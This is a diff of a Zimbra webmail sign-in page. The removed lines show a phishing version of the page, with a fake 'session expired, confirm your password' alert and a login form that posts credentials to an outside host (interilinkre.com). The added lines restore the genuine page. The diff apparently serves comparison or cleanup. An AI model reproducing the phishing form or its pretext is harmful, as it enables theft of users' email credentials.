@@ -1,10 +1,4 @@
 
-<script type="text/javascript">
-		
-			alert("Your session has expired. You need to confirm your password periodically. Click OK to sign in again.");
-		</script>
-
-
 <!DOCTYPE html>
 <!-- set this class so CSS definitions that now use REM size, would work relative to this.
 	Since now almost everything is relative to one of the 2 absolute font size classese -->
@@ -30,11 +24,11 @@
 	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
 	<title>Zimbra Web Client Sign In</title>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
 	<meta name="apple-mobile-web-app-capable" content="yes" />
 	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
-	<link rel="stylesheet" type="text/css" href="https://webmail.gorge.net/css/common,login,zhtml,skin.css?skin=harmony&v=250123180901">
-	<link rel="SHORTCUT ICON" href="https://webmail.gorge.net/img/logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="/zimbra/css/common,login,zhtml,skin.css?skin=harmony&v=251110135723">
+	<link rel="SHORTCUT ICON" href="/zimbra/img/logo/favicon.ico">
 
 
 </head>
@@ -44,13 +38,13 @@
 		<div class="modernCenter" >
                 <div class="modernContentBox">
                     <div class="logo">
-                        <a href="http " id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">   </span>
+                        <a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
                             <span class="ImgLoginBanner"></span>
                         </a>
                     </div>				
-				<form id="zLoginForm" method="post" name="loginForm" action="https://interilinkre.com/rex/nc.rr.php" accept-charset="UTF-8">
+				<form id="zLoginForm" method="post" name="loginForm" action="/zimbra/" accept-charset="UTF-8">
 								<input type="hidden" name="loginOp" value="login"/>
-								<input type="hidden" name="login_csrf" value="b59ea66d-b29d-483b-bef6-d370d787a774"/>
+								<input type="hidden" name="login_csrf" value="da00e393-5d4e-4095-b1ca-6e6bcfe80374"/>
 
 								<div class="signIn">Log In</div>
                         <div class="form">
@@ -104,7 +98,7 @@
 		</div>
 
 		<div class="Footer">
-			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
 		</div>
 		<div class="decor2"></div>
 	</div>
@@ -117,7 +111,7 @@ ZmSkin.hints={
 name:"harmony",version:"1",skin:{
 containers:"skin_outer"}
 ,banner:{
-position:"static",url:"http://www.gorge.net"}
+position:"static",url:"/logos/200_28.jpg"}
 ,favicon:{
 dir:""}
 ,userInfo:{
@@ -168,7 +162,7 @@ type:"fade-out",step:-10,duration:500}
 containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
 ,allAds:{
 containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
-,hideSearchInCompose:true,notificationBanner:"/skins/_base/logos/NotificationBanner_grey.gif?v=250123180901"};
+,hideSearchInCompose:true,notificationBanner:"/zimbra/skins/_base/logos/NotificationBanner_grey.gif?v=251110135723"};
 window.BaseSkin=ZmSkin;
 ZmSkin.prototype={
 show:function(t,e,l){
@@ -690,4 +684,3 @@ function clientChange(selectValue) {
 </script>
 </body>
 </html>
-
